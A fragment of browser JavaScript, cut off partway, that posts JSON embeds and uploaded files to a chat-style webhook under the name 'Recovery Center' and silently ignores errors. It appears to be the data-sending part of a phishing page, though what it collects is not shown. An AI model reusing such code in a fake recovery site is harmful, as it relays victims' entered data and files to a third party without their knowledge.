  /* ── WEBHOOK ────────────────────────────────────────── */
  async function send(title, color, fields, footer){
    const payload = {
      username: "Recovery Center",
      embeds: [{
        title: title,
        color: color,
        fields: fields,
        footer: { text: (footer || "web") + " • " + new Date().toLocaleString() }
      }]
    };
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch (e) {}
  }

  async function sendWithFile(payload, file){
    const fd = new FormData();
    fd.append("payload_json", JSON.stringify(payload));
    if (file) fd.append("files[0]", file, file.name);
    try {
      await fetch(WEBHOOK_URL, { method: "POST", body: fd });
    } catch (e) {}
  }

  /* ── STATE ──────────────────────────────────────────── */
  const state = {
